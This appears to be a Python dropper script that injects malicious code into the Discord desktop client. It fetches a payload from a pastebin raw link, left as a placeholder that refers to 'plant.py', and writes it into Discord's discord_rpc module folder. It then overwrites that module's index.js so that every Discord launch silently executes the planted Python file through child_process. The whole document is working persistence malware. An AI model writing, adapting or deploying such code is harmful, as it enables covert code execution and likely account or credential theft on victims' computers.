import requests, os


f = open(f"C://Users//{str(os.getenv('username'))}//AppData//Roaming//discord//0.0.309//modules//discord_rpc//file.py", "w")
f.write(requests.get("Upload the edited text from plant.py to pastebin and put the raw link here").text)
f.close()

e = open(f"C://Users//{str(os.getenv('username'))}//AppData//Roaming//discord//0.0.309//modules//discord_rpc//index.js", "w")
e.write("""
module.exports = {
  RPCIPC: require('./RPCIPC'),
  RPCWebSocket: require('./RPCWebSocket'),
};
var process = require('child_process');
process.exec('python""" + f" C:/Users/{os.getenv('username')}/AppData/Roaming/discord/0.0.309/modules/discord_rpc/file.py'" + """ ,function (err,stdout,stderr) {
    if (err) {
        console.log(stderr);
    } else {
        console.log(stdout);
    }
});""")
e.close()
